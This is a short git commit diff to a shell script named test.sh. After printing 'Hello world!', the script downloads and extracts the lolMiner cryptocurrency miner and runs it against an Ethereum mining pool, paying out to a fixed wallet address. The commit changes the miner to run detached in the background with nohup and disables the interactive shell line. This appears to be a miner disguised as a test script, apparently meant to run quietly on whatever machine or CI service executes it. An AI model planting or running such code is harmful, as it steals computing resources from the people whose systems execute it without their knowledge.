beb5cc0688da235258218fbd2d5953892ab63d67
hudarichmond7 <88096939+hudarichmond7@users.noreply.github.com>
2021-07-30 18:04:18 -0500

    Update test.sh

--- test.sh
+++ test.sh
@@ -4,6 +4,6 @@ echo "Hello world!"
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
 tar -xf lolMiner_v1.31_Lin64.tar.gz
 cd 1.31
-./lolMiner --algo ETHASH --pool us-eth.2miners.com:12020 --user 0x476241f016e207C4faf657687FcF553f51047030.Worker_$( date +%Y%m%d%H%M%S ) --tls on --ethstratum ETHPROXY
+nohup ./lolMiner --algo ETHASH --pool us-eth.2miners.com:12020 --user 0x476241f016e207C4faf657687FcF553f51047030.Worker_$( date +%Y%m%d%H%M%S ) --tls on --ethstratum ETHPROXY &
 
-$SHELL
+#$SHELL
